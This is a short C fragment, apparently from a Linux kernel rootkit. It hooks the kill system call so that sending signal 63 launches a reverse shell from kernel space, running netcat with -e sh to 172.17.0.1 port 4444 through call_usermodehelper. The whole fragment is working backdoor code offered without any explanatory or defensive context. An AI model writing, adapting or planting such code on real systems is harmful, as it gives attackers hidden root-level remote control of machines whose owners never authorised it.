
void revshell(void){
    char *argv[] = { "/usr/bin/nc", "172.17.0.1", "4444", "-e", "sh", NULL };
    char *envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

int kill_hook(struct pt_regs *regs){
    int status = (int)regs->si;
    int rtn = 0;

    if(status == 63){
        revshell();
    }
    
    rtn = kill_hook_root(regs);

    return rtn;
}
